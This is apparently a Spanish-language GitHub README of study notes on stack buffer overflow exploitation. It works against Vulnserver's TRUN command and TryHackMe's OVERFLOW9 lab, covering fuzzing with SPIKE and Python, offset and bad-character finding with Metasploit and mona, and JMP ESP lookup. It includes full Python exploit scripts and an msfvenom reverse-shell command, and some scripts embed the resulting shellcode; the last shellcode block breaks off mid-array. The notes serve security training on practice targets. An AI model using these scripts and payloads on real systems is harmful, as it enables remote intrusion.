# -Buffer-Overflow-

Representacion grafica de que es lo que pasa cuando se genera un BoF

![image](https://github.com/gecr07/-Buffer-Overflow-/assets/63270579/98bf083c-df68-4159-be95-a1fa29715c99)


El Define una serie de pasos lo cual me parece bien para hacer esto ordenado

![image](https://github.com/gecr07/-Buffer-Overflow-/assets/63270579/b06f1f2e-9796-4e70-a11f-fa9542521428)

Cada uno de estos pasos son:

![image](https://github.com/gecr07/-Buffer-Overflow-/assets/63270579/3ae16b52-ff6b-4fdc-97a0-40dc66449f43)


## 1. Spike (generic_send_tcp)

When you need to analyze a new network protocol for buffer overflows or similar weaknesses, the SPIKE is the tool of choice for professionals. While it requires a strong knowledge of C to use, it produces results second to none in the field. (ojo tiene muchas herramientas no solo generic send)

```
sudo apt install spike
```
> https://www.kali.org/tools/spike/

Y el modo de uso es:

```bash
# La ip sera del vuln server

./generic_send_tcp host port spike_script SKIPVAR SKIPSTR

./generic_send_tcp 192.168.0.100 9999 something.spk 0 0

```

El script en spike que el escribio es el siguiente 

![image](https://github.com/gecr07/-Buffer-Overflow-/assets/63270579/bbafb67f-1e2e-42c1-bce9-c1e62fb56a50)

Y lo que va a hacer esto es enviar peticiones a cada una de las  funciones del vuln server. (por defecto esta escuchando en el puerto 9999 el VULN server)

```bash
s_readline();
s_string("TRUN ");
s_string_variable("0");

```

Ya en mi maquina pues comenzamos con el spike.

```bash
./generic_send_tcp 192.168.0.100 9999 something.spk 0 0

```

Nos damos cuenta que algo falla porque. Access violation lo que nos dice que algo es vulnerable revisa siempre el EIP.

![image](https://github.com/gecr07/-Buffer-Overflow-/assets/63270579/5f0aaf08-750b-480b-bd24-fc29ea0a3def)

Sobre escribimos el EIP con puras A (41) y de hecho en Kali igual esta la prueba.

![image](https://github.com/gecr07/-Buffer-Overflow-/assets/63270579/aa415ef2-62a9-4886-ae6b-a982e017184e)

## 2. Fuzzing 

En el video lo hace con el depurador abierto cosa que yo no puedo nunca cae en el except lo que hice fue dejar corriendo el programa y al parecer si me funciono.

![image](https://github.com/gecr07/-Buffer-Overflow-/assets/63270579/59519020-873f-4e79-8e15-dc15c1e002ad)

```python
#!/usr/bin/python3

import sys, socket

from time import sleep

buffer = "A" * 100

while True:
        try:
                s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.connect(('192.168.230.129',9999))

                payload= "TRUN /.:/" + buffer

                s.send((payload.encode()))
                s.close()
                sleep(1)
                buffer = buffer + "A" * 100
        except:
                print ("Fuzzing crashed at %s bytes" % str(len(buffer)))        
                sys.exit()

```

De hecho en el video de TCM no crashea el programa mas bien el lo para desde la consola cuando ve que se produce el access violation.

![image](https://github.com/gecr07/-Buffer-Overflow-/assets/63270579/615aa702-4357-4dd1-89a0-981d48200a25)


## 3. Encontrar el offset (metasploit)

Vamos a ver exactamente que ofset sobre escribe el EIP.

```
/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 3000

/usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -l 3000 -q 386F4337
```

![image](https://github.com/gecr07/-Buffer-Overflow-/assets/63270579/bd4e4ba8-7df6-461c-aab6-606b4497b6f1)

![image](https://github.com/gecr07/-Buffer-Overflow-/assets/63270579/47d7c90f-dd3a-4903-8dcb-86778622dc11)


```python
import sys, socket

from time import sleep

buffer = "A" * 100

offset = "Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2An3An4An5An6An7An8An9Ao0Ao1Ao2Ao3Ao4Ao5Ao6Ao7Ao8Ao9Ap0Ap1Ap2Ap3Ap4Ap5Ap6Ap7Ap8Ap9Aq0Aq1Aq2Aq3Aq4Aq5Aq6Aq7Aq8Aq9Ar0Ar1Ar2Ar3Ar4Ar5Ar6Ar7Ar8Ar9As0As1As2As3As4As5As6As7As8As9At0At1At2At3At4At5At6At7At8At9Au0Au1Au2Au3Au4Au5Au6Au7Au8Au9Av0Av1Av2Av3Av4Av5Av6Av7Av8Av9Aw0Aw1Aw2Aw3Aw4Aw5Aw6Aw7Aw8Aw9Ax0Ax1Ax2Ax3Ax4Ax5Ax6Ax7Ax8Ax9Ay0Ay1Ay2Ay3Ay4Ay5Ay6Ay7Ay8Ay9Az0Az1Az2Az3Az4Az5Az6Az7Az8Az9Ba0Ba1Ba2Ba3Ba4Ba5Ba6Ba7Ba8Ba9Bb0Bb1Bb2Bb3Bb4Bb5Bb6Bb7Bb8Bb9Bc0Bc1Bc2Bc3Bc4Bc5Bc6Bc7Bc8Bc9Bd0Bd1Bd2Bd3Bd4Bd5Bd6Bd7Bd8Bd9Be0Be1Be2Be3Be4Be5Be6Be7Be8Be9Bf0Bf1Bf2Bf3Bf4Bf5Bf6Bf7Bf8Bf9Bg0Bg1Bg2Bg3Bg4Bg5Bg6Bg7Bg8Bg9Bh0Bh1Bh2Bh3Bh4Bh5Bh6Bh7Bh8Bh9Bi0Bi1Bi2Bi3Bi4Bi5Bi6Bi7Bi8Bi9Bj0Bj1Bj2Bj3Bj4Bj5Bj6Bj7Bj8Bj9Bk0Bk1Bk2Bk3Bk4Bk5Bk6Bk7Bk8Bk9Bl0Bl1Bl2Bl3Bl4Bl5Bl6Bl7Bl8Bl9Bm0Bm1Bm2Bm3Bm4Bm5Bm6Bm7Bm8Bm9Bn0Bn1Bn2Bn3Bn4Bn5Bn6Bn7Bn8Bn9Bo0Bo1Bo2Bo3Bo4Bo5Bo6Bo7Bo8Bo9Bp0Bp1Bp2Bp3Bp4Bp5Bp6Bp7Bp8Bp9Bq0Bq1Bq2Bq3Bq4Bq5Bq6Bq7Bq8Bq9Br0Br1Br2Br3Br4Br5Br6Br7Br8Br9Bs0Bs1Bs2Bs3Bs4Bs5Bs6Bs7Bs8Bs9Bt0Bt1Bt2Bt3Bt4Bt5Bt6Bt7Bt8Bt9Bu0Bu1Bu2Bu3Bu4Bu5Bu6Bu7Bu8Bu9Bv0Bv1Bv2Bv3Bv4Bv5Bv6Bv7Bv8Bv9Bw0Bw1Bw2Bw3Bw4Bw5Bw6Bw7Bw8Bw9Bx0Bx1Bx2Bx3Bx4Bx5Bx6Bx7Bx8Bx9By0By1By2By3By4By5By6By7By8By9Bz0Bz1Bz2Bz3Bz4Bz5Bz6Bz7Bz8Bz9Ca0Ca1Ca2Ca3Ca4Ca5Ca6Ca7Ca8Ca9Cb0Cb1Cb2Cb3Cb4Cb5Cb6Cb7Cb8Cb9Cc0Cc1Cc2Cc3Cc4Cc5Cc6Cc7Cc8Cc9Cd0Cd1Cd2Cd3Cd4Cd5Cd6Cd7Cd8Cd9Ce0Ce1Ce2Ce3Ce4Ce5Ce6Ce7Ce8Ce9Cf0Cf1Cf2Cf3Cf4Cf5Cf6Cf7Cf8Cf9Cg0Cg1Cg2Cg3Cg4Cg5Cg6Cg7Cg8Cg9Ch0Ch1Ch2Ch3Ch4Ch5Ch6Ch7Ch8Ch9Ci0Ci1Ci2Ci3Ci4Ci5Ci6Ci7Ci8Ci9Cj0Cj1Cj2Cj3Cj4Cj5Cj6Cj7Cj8Cj9Ck0Ck1Ck2Ck3Ck4Ck5Ck6Ck7Ck8Ck9Cl0Cl1Cl2Cl3Cl4Cl5Cl6Cl7Cl8Cl9Cm0Cm1Cm2Cm3Cm4Cm5Cm6Cm7Cm8Cm9Cn0Cn1Cn2Cn3Cn4Cn5Cn6Cn7Cn8Cn9Co0Co1Co2Co3Co4Co5Co6Co7Co8Co9Cp0Cp1Cp2Cp3Cp4Cp5Cp6Cp7Cp8Cp9Cq0Cq1Cq2Cq3Cq4Cq5Cq6Cq7Cq8Cq9Cr0Cr1Cr2Cr3Cr4Cr5Cr6Cr7Cr8Cr9Cs0Cs1Cs2Cs3Cs4Cs5Cs6Cs7Cs8Cs9Ct0Ct1Ct2Ct3Ct4Ct5Ct6Ct7Ct8Ct9Cu0Cu1Cu2Cu3Cu4Cu5Cu6Cu7Cu8Cu9Cv0Cv1Cv2Cv3Cv4Cv5Cv6Cv7Cv8Cv9Cw0Cw1Cw2Cw3Cw4Cw5Cw6Cw7Cw8Cw9Cx0Cx1Cx2Cx3Cx4Cx5Cx6Cx7Cx8Cx9Cy0Cy1Cy2Cy3Cy4Cy5Cy6Cy7Cy8Cy9Cz0Cz1Cz2Cz3Cz4Cz5Cz6Cz7Cz8Cz9Da0Da1Da2Da3Da4Da5Da6Da7Da8Da9Db0Db1Db2Db3Db4Db5Db6Db7Db8Db9Dc0Dc1Dc2Dc3Dc4Dc5Dc6Dc7Dc8Dc9Dd0Dd1Dd2Dd3Dd4Dd5Dd6Dd7Dd8Dd9De0De1De2De3De4De5De6De7De8De9Df0Df1Df2Df3Df4Df5Df6Df7Df8Df9Dg0Dg1Dg2Dg3Dg4Dg5Dg6Dg7Dg8Dg9Dh0Dh1Dh2Dh3Dh4Dh5Dh6Dh7Dh8Dh9Di0Di1Di2Di3Di4Di5Di6Di7Di8Di9Dj0Dj1Dj2Dj3Dj4Dj5Dj6Dj7Dj8Dj9Dk0Dk1Dk2Dk3Dk4Dk5Dk6Dk7Dk8Dk9Dl0Dl1Dl2Dl3Dl4Dl5Dl6Dl7Dl8Dl9Dm0Dm1Dm2Dm3Dm4Dm5Dm6Dm7Dm8Dm9Dn0Dn1Dn2Dn3Dn4Dn5Dn6Dn7Dn8Dn9Do0Do1Do2Do3Do4Do5Do6Do7Do8Do9Dp0Dp1Dp2Dp3Dp4Dp5Dp6Dp7Dp8Dp9Dq0Dq1Dq2Dq3Dq4Dq5Dq6Dq7Dq8Dq9Dr0Dr1Dr2Dr3Dr4Dr5Dr6Dr7Dr8Dr9Ds0Ds1Ds2Ds3Ds4Ds5Ds6Ds7Ds8Ds9Dt0Dt1Dt2Dt3Dt4Dt5Dt6Dt7Dt8Dt9Du0Du1Du2Du3Du4Du5Du6Du7Du8Du9Dv0Dv1Dv2Dv3Dv4Dv5Dv6Dv7Dv8Dv9"

while True:
        try:
                s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.connect(('192.168.230.129',9999))

                payload= "TRUN /.:/" + offset

                s.send((payload.encode()))
                s.close()
                sleep(1)
                buffer = buffer + "A" * 100
        except:
                print ("Fuzzing crashed at %s bytes" % str(len(buffer)))
                sys.exit()
```

## 4. Sobre escribir el EIP

Vamos a verificar qu si se pudiera escribir una B osea 42 en el EIP 


![image](https://github.com/gecr07/-Buffer-Overflow-/assets/63270579/04eadeac-5f5a-411e-ad34-19e4dd6a6a02)


```python
#!/usr/bin/python3

import sys, socket

from time import sleep

shellcode = "A" * 2003 + "B" * 4


while True:
	try:
		s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
		s.connect(('192.168.230.129',9999))

		payload= "TRUN /.:/" + shellcode

		s.send((payload.encode()))
		s.close()
		sleep(1)
		buffer = buffer + "A" * 100
	except:
		print ("Fuzzing crashed at %s bytes" % str(len(shellcode)))	
		sys.exit()
```

## 5. Find bad chars

Vamos a configurar que mona guarde archivos en el dir C:\mona

```
!mona config -set workingfolder c:\mona
```

Por defecto el 00 o null es un bad char porque en windows con eso acaban las cadenas y asi el SO sabe donde acaba (no se  si en linux fucnione asi). 

> https://github.com/cytopia/badchars

Metemeos esos badchars con el script. Recuerda esa pagina de arriba es para que genere los bad chars osea todos pero igual de ahi los puedes tomar.

> La lista de caracteres que mencionas va desde \x01 hasta \xff, representando todos los bytes posibles en un byte (256 bytes en total). Esta lista se crea de manera exhaustiva para cubrir todos los posibles valores de un byte, ya que en algunos escenarios, es necesario considerar todos los caracteres posibles que podrían ser considerados "malos" o problemáticos en una inyección de shellcode.

En el video dice que si por ejemplo existen bad caracters consecutivos solo el primero va a ser el que le sigue no (no se porque de esta regla.

![image](https://github.com/gecr07/-Buffer-Overflow-/assets/63270579/c5f13079-2a9c-4858-96bd-56cbb88c58e7)


```python
#!/usr/bin/python3

import sys, socket
from time import sleep


badchars = (
  "\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10"
  "\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x20"
  "\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30"
  "\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40"
  "\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50"
  "\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f\x60"
  "\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70"
  "\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f\x80"
  "\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90"
  "\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0"
  "\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0"
  "\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0"
  "\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0"
  "\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0"
  "\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0"
  "\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff"
)



shellcode = "A" * 2003 + "B" * 4 + badchars


while True:
        try:
                s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.connect(('192.168.230.129',9999))

                payload= "TRUN /.:/" + shellcode

                s.send((payload.encode()))
                s.close()
                sleep(1)
                buffer = buffer + "A" * 100
        except:
                print ("Fuzzing crashed at %s bytes" % str(len(shellcode)))
                sys.exit()


```

## 6. Find the righ module

Se puede usar mona que es un modulo con muchas opciones lo pones en la ruta de PyCommands recuerda cuando poner de workingfolder guardara archivos ahi pero no muevas el .py de la carpeta de PyCommands

```
!mona config -set workingfolder c:\mona
!mona bytearray -cpb "\x00"
```
(update) Pero espera entonces eso de bytearray genera un bin despues de eso mandas los badchars con tu script el programa se va a parar ya estan en el ESP los badchars los vamos a comparar para que te diga cual es una bad char.

```
!mona compare -f c:\mona\bytearray.bin -a Direccion_del_ESP
```

![image](https://github.com/gecr07/-Buffer-Overflow-/assets/63270579/b611bd66-39a2-4391-83ed-d7669d11bb8c)


Esto genera un archivo .bin lo que sigue es compararlo en este caso no pude poner a mona en el disco C: entonces tienes que poner toda la ruta. (no es necesario poner toda la ruta si ya configuraste el workingfolder)

![image](https://github.com/gecr07/-Buffer-Overflow-/assets/63270579/23ba5603-0a0b-4a43-bdc7-1311e7e2cb43)

Vamos a encontrar los modulos que no tienen proteccion:

```
!mona modules
```

![image](https://github.com/gecr07/-Buffer-Overflow-/assets/63270579/5816b9fb-79a4-4b62-aa3c-16eb1ec4c9e7)

AHORA  ya vimos que de essfunc.dll no tiene protecciones por lo tanto necesitamos apuntar ahi en donde este un JMP ESP para que despues llame a nuestra shellcode.

```
!mona jmp -r ESP  -m "essfunc.dll"
```
![image](https://github.com/gecr07/-Buffer-Overflow-/assets/63270579/07b20cf5-c808-4d59-b0ff-d9dcd03a3852)


Vamos a usar esa direccion para que apunte a JMP ESP y esa a nuestra shellcode.


![image](https://github.com/gecr07/-Buffer-Overflow-/assets/63270579/68dd75da-7d33-423b-9b5d-65ddccbbd41d)

### Alternativa...

Como alternativa KALI tienen NASM

![image](https://github.com/gecr07/-Buffer-Overflow-/assets/63270579/decc1477-930a-4e7f-b236-e51c0dca3c17)

Y entonces buscamos JMP ESP

![image](https://github.com/gecr07/-Buffer-Overflow-/assets/63270579/a371b4c5-092c-4485-a308-306389383afa)

Y lo vamos abuscar con mona 

```
!mona find -s "xff\xe4" -m essfunc.dll
```
Este valor que nos da del modulo de que no tiene protecciones (essfunc.dll) es el que vamos a poner en el return address o lo que es lo mismo en el EIP(para este caso osea la sigueinte instrccion).

Aqui me falto este script donde se puede ver que si sobre escribes el EIP.

```python

#!/usr/bin/python3

import sys, socket
from time import sleep



shellcode = b"A" * 2003 + b"\xaf\x11\x50\x62"  + b"\x90" * 16

print ("Vamos...1")

while True:
	try:
		s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
		s.connect(('192.168.230.129',9999))

		payload= b"TRUN /.:/" + shellcode

		s.send((payload))
		s.close()
		sleep(1)
		#buffer = buffer + "A" * 100
	except:
		print ("Fuzzing crashed at %s bytes" % str(len(shellcode)))	
		sys.exit()


```

## 6. Creando shellcode

Vamos a usar el msfvenom

```bash
msfvenom -p windows/shell_reverse_tcp LHOST=192.168.230.128 LPORT=4444 EXITFUNC=thread -f c -a x86 -b "\x00"
-f formato en c
-a arquitectura x86
-b bad characters
```

Y pon la shell code que se genero en el script

```python

#!/usr/bin/python3

import sys, socket
from time import sleep

overflow = (
b"\xdb\xcb\xba\x9f\x23\x91\x62\xd9\x74\x24\xf4\x58\x29\xc9"
b"\xb1\x52\x31\x50\x17\x83\xe8\xfc\x03\xcf\x30\x73\x97\x13"
b"\xde\xf1\x58\xeb\x1f\x96\xd1\x0e\x2e\x96\x86\x5b\x01\x26"
b"\xcc\x09\xae\xcd\x80\xb9\x25\xa3\x0c\xce\x8e\x0e\x6b\xe1"
b"\x0f\x22\x4f\x60\x8c\x39\x9c\x42\xad\xf1\xd1\x83\xea\xec"
b"\x18\xd1\xa3\x7b\x8e\xc5\xc0\x36\x13\x6e\x9a\xd7\x13\x93"
b"\x6b\xd9\x32\x02\xe7\x80\x94\xa5\x24\xb9\x9c\xbd\x29\x84"
b"\x57\x36\x99\x72\x66\x9e\xd3\x7b\xc5\xdf\xdb\x89\x17\x18"
b"\xdb\x71\x62\x50\x1f\x0f\x75\xa7\x5d\xcb\xf0\x33\xc5\x98"
b"\xa3\x9f\xf7\x4d\x35\x54\xfb\x3a\x31\x32\x18\xbc\x96\x49"
b"\x24\x35\x19\x9d\xac\x0d\x3e\x39\xf4\xd6\x5f\x18\x50\xb8"
b"\x60\x7a\x3b\x65\xc5\xf1\xd6\x72\x74\x58\xbf\xb7\xb5\x62"
b"\x3f\xd0\xce\x11\x0d\x7f\x65\xbd\x3d\x08\xa3\x3a\x41\x23"
b"\x13\xd4\xbc\xcc\x64\xfd\x7a\x98\x34\x95\xab\xa1\xde\x65"
b"\x53\x74\x70\x35\xfb\x27\x31\xe5\xbb\x97\xd9\xef\x33\xc7"
b"\xfa\x10\x9e\x60\x90\xeb\x49\x4f\xcd\x15\x09\x27\x0c\xd9"
b"\x1b\xe4\x99\x3f\x71\x04\xcc\xe8\xee\xbd\x55\x62\x8e\x42"
b"\x40\x0f\x90\xc9\x67\xf0\x5f\x3a\x0d\xe2\x08\xca\x58\x58"
b"\x9e\xd5\x76\xf4\x7c\x47\x1d\x04\x0a\x74\x8a\x53\x5b\x4a"
b"\xc3\x31\x71\xf5\x7d\x27\x88\x63\x45\xe3\x57\x50\x48\xea"
b"\x1a\xec\x6e\xfc\xe2\xed\x2a\xa8\xba\xbb\xe4\x06\x7d\x12"
b"\x47\xf0\xd7\xc9\x01\x94\xae\x21\x92\xe2\xae\x6f\x64\x0a"
b"\x1e\xc6\x31\x35\xaf\x8e\xb5\x4e\xcd\x2e\x39\x85\x55\x4e"
b"\xd8\x0f\xa0\xe7\x45\xda\x09\x6a\x76\x31\x4d\x93\xf5\xb3"
b"\x2e\x60\xe5\xb6\x2b\x2c\xa1\x2b\x46\x3d\x44\x4b\xf5\x3e"
b"\x4d")


shellcode = b"A" * 2003 + b"\xaf\x11\x50\x62"  + b"\x90" * 16 + overflow

print ("Vamos...1")

while True:
	try:
		s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
		s.connect(('192.168.230.129',9999))

		payload= b"TRUN /.:/" + shellcode

		s.send((payload))
		s.close()
		sleep(1)
		#buffer = buffer + "A" * 100
	except:
		print ("Fuzzing crashed at %s bytes" % str(len(shellcode)))	
		sys.exit()
```

## Tryhackme Buffer Overflow Prep

En este caso se van a documentar los pasos que se utilizan para sacar los offsets y los badchars.

```bash
!mona config -set workingfolder c:\mona\%p
xfreerdp /u:admin /p:password /cert:ignore /v:10.10.131.190 /workarea /tls-seclevel:0 /timeout:80000

```

Primero se configura el directorio de trabajo de mona en este caso le % es para decir que cree una carpeta de acuerdo al nombre del ejectable en este caso oscp.exe entonces va a crear una carpeta llamada oscp.Se asume que ya tenemos la funcion vulnerable( hay que practicar esto). vamos a usar un script para fuzzear y ver donde el programa crashea. fuzzer.py 

```python3
#!/usr/bin/env python3

import socket, time, sys

ip = "10.10.238.47"

port = 1337
timeout = 5
prefix = "OVERFLOW9 "

string = prefix + "A" * 100

while True:
  try:
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
      s.settimeout(timeout)
      s.connect((ip, port))
      s.recv(1024)
      print("Fuzzing with {} bytes".format(len(string) - len(prefix)))
      s.send(bytes(string, "latin-1"))
      s.recv(1024)
  except:
    print("Fuzzing crashed at {} bytes".format(len(string) - len(prefix)))
    sys.exit(0)
  string += 100 * "A"
  time.sleep(1)


```

Estoy resolviendo el OVERFLOW9 en esta funcion el programa crashea en el 1600 entonces podriamos generar un patron de 1700 en adelante...

![image](https://github.com/gecr07/-Buffer-Overflow-/assets/63270579/ed4e1a57-5d56-4ca3-8b6c-739352784f0c)

Para crear un patron vamos a usar una herramienta de metasploit.

```bash 
/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 1700
```

![image](https://github.com/gecr07/-Buffer-Overflow-/assets/63270579/cbcb1b9f-dc0a-4340-8c9a-653e9b427a16)


Para ingresar los datos nos vamos a ayudar del siguiente script (que es el que yo recomiendo que se use siempre). eip.py

```python3
import socket

ip = "10.10.176.71"
port = 1337

prefix = "OVERFLOW9 "
offset = 0
overflow = "A" * offset
retn = ""
padding = ""
payload = ""
postfix = ""

buffer = prefix + overflow + retn + padding + payload + postfix

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

try:
  s.connect((ip, port))
  print("Sending evil buffer...")
  s.send(bytes(buffer + "\r\n", "latin-1"))
  print("Done!")
except:
  print("Could not connect.")


```

Este script se va a ir modificando a necesidad por ejemplo para encontrar el offset vamos a enviar el patron que generamos lo ponemos en el payload.


![image](https://github.com/gecr07/-Buffer-Overflow-/assets/63270579/4ecbdbc9-aebb-4d1c-9291-5f7d18abb0f9)

Al enviar este patron tenemos que fijarnos en el EIP.

![image](https://github.com/gecr07/-Buffer-Overflow-/assets/63270579/8e108d6f-86b1-4c16-959e-a0a21ec98dd4)

El siguiente paso tenemos 2 opciones

### Opcion 1

Con ayuda de otra herramienta de metasploit calculamos el offset.

![image](https://github.com/gecr07/-Buffer-Overflow-/assets/63270579/575ef751-b024-43b9-9fae-9141cb060601)


```
/usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -l 1700 -q 35794234
```
### Opcion 2

Con ayuda de mona

![image](https://github.com/gecr07/-Buffer-Overflow-/assets/63270579/161572e8-1ae8-4b89-a444-5b5922f53871)

```
!mona findmsp -distance 1700
```

Una vez que ya tenemos el offset procedemos a buscar los bad characters. Tenemos un script que genera todos los caracteres badchars.py

```python3
for x in range(1, 256):
  print("\\x" + "{:02x}".format(x), end='')
print() 
```

![image](https://github.com/gecr07/-Buffer-Overflow-/assets/63270579/0c9da3db-5e6d-43e1-89a1-33684c7341a5)

Una vez que tenemos todos los bad character y el offset modificamos nuestro eip.py Para asegurarnos que si logramos sobre esccribir el EIP ponemos en retun BBBB

![image](https://github.com/gecr07/-Buffer-Overflow-/assets/63270579/ff97b8bf-018f-4bfa-86f9-9012eb82b07a)

Y si todo sale bien el EIP va a estar con 42 que es el valor de la BBBB.

![image](https://github.com/gecr07/-Buffer-Overflow-/assets/63270579/0c23f9d7-8244-4cb4-960c-d93547b35386)

Entonces ahora si vamos a hacer uso de mona para poder comparar mona lo que hace es generar los numeros del 1 hasta el 255 (me parece) en hex y al comparar pues va viendo si es igual. nota algo importante para evitar problemas reinica el programa. recuerda el caracter 00 ese siempre es un badchar ya por defecto. Tome OVERFLOW9 porque es un caso especial con caracteres malos seguidos...

```bash
!mona bytearray -b "\x00"

```

![image](https://github.com/gecr07/-Buffer-Overflow-/assets/63270579/a41b63b8-7a25-4e9e-ba9d-92aa8a632bf5)

Carga de nuevo el programa y manda el payload con todos los caracteres. Vamos a comparar con mona.

```bash
!mona compare -f C:\mona\oscp\bytearray.bin -a esp
```
![image](https://github.com/gecr07/-Buffer-Overflow-/assets/63270579/af45bf2b-bf81-4238-b34b-4b7f57ba741c)

En este caso mona nos arrojo los siguientes badcharactes: 00 04 05 3e 3f e1 e2. NOTA usualmente cuando se ponen caracteres seguidos por ejemplo el 04 y 05 se toma el primero y el otro no es solo se usa el primero. El otro se refleja como badcharacter por culpa del primero. Yo pensaba que esto era invariable pues resulta que pueden existir casos donde los bad charaters si sean seguidos para este caso el 3e 3f.

```
!mona bytearray -b "\x00\x04"
!mona compare -f C:\mona\oscp\bytearray.bin -a esp
```

Si la regla que describi arriba es cierta entonces al quitar el 04 cuando comparemos va a salir el 04 pero no el 05. Recuerda cerrar el depurador y volverlo a abrir despues modificar el script(quitando el 04 en este caso) y despues enviar el payload para finalmente comparar con mona.

![image](https://github.com/gecr07/-Buffer-Overflow-/assets/63270579/3a62c170-b29d-4f52-a4d6-fea4eb0a3f6d)

Es correcto no aparecio el 05 entonces la regla se cumple y el 05 no es badchar vamos a seguir con los otros. 00 04 3e 3f e1 e2

```
!mona bytearray -b "\x00\x04\x3e"
!mona compare -f C:\mona\oscp\bytearray.bin -a esp

```
Si la regla se cumple deberia de desaparecer el 3f (en este caso ya sabemos que el 3f tambien es un badcharacter). Recuerda ir quitando los badcharacters que vas probando del script.

![image](https://github.com/gecr07/-Buffer-Overflow-/assets/63270579/250c698d-286a-4db3-8db7-874b403c91bd)

![image](https://github.com/gecr07/-Buffer-Overflow-/assets/63270579/3f0c1396-fadd-4379-81b3-131281f3149e)

En este caso no se fue el 3f apesar que quitamos el 3e entonces esto quiere decir que es un bad char incluso aparecio un 40 que es el siguiente numero despues del 3f 

![image](https://github.com/gecr07/-Buffer-Overflow-/assets/63270579/f84505be-3d63-4a68-848a-49f4ae2882fe)

Entonces ahora si el 3f si es un bad char entonces se tiene que ir el 40.

```
!mona bytearray -b "\x00\x04\x3e\x3f"
!mona compare -f C:\mona\oscp\bytearray.bin -a esp
```

Y efectivamente si se quito el 40 entonces ya vimos que el 3e y el 3f son bad char consecutivos lo que es un caso dificil. Finalmente vamos a quitar el e1 y supongo que la regla de que agarrar el primero y el segundo no es bad char se cumpla.

```
!mona bytearray -b "\x00\x04\x3e\x3f\xe1"
!mona compare -f C:\mona\oscp\bytearray.bin -a esp
```

![image](https://github.com/gecr07/-Buffer-Overflow-/assets/63270579/50533b16-e52a-4972-a8a3-d8044290186c)

Y efectivamente se fueron todos los badchars cuando dice Unmodified es cuando ya terminamos y quitamos todos los badchars...

## Explotacion 

Pues ya teniendo los badchars y el offset solo es cuestion de crear la shellcode y modificar nuestros scripts.

```
!mona modules
!mona jmp -r ESP  -m "essfunc.dll"
msfvenom -p windows/shell_reverse_tcp LHOST=192.168.230.128 LPORT=4444 EXITFUNC=thread -f c -a x86 -b "\x00

```

Esto nos genera la shellcode indicandole los badchars.

```
#!/usr/bin/python3

import sys, socket
from time import sleep

overflow = (
b"\xdb\xc5\xbd\xc5\x8f\xbb\x3d\xd9\x74\x24\xf4\x5a\x2b\xc9" \
b"\xb1\x52\x31\x6a\x17\x83\xc2\x04\x03\xaf\x9c\x59\xc8\xd3" \
b"\x4b\x1f\x33\x2b\x8c\x40\xbd\xce\xbd\x40\xd9\x9b\xee\x70" \
b"\xa9\xc9\x02\xfa\xff\xf9\x91\x8e\xd7\x0e\x11\x24\x0e\x21" \
b"\xa2\x15\x72\x20\x20\x64\xa7\x82\x19\xa7\xba\xc3\x5e\xda" \
b"\x37\x91\x37\x90\xea\x05\x33\xec\x36\xae\x0f\xe0\x3e\x53" \
b"\xc7\x03\x6e\xc2\x53\x5a\xb0\xe5\xb0\xd6\xf9\xfd\xd5\xd3" \
b"\xb0\x76\x2d\xaf\x42\x5e\x7f\x50\xe8\x9f\x4f\xa3\xf0\xd8" \
b"\x68\x5c\x87\x10\x8b\xe1\x90\xe7\xf1\x3d\x14\xf3\x52\xb5" \
b"\x8e\xdf\x63\x1a\x48\x94\x68\xd7\x1e\xf2\x6c\xe6\xf3\x89" \
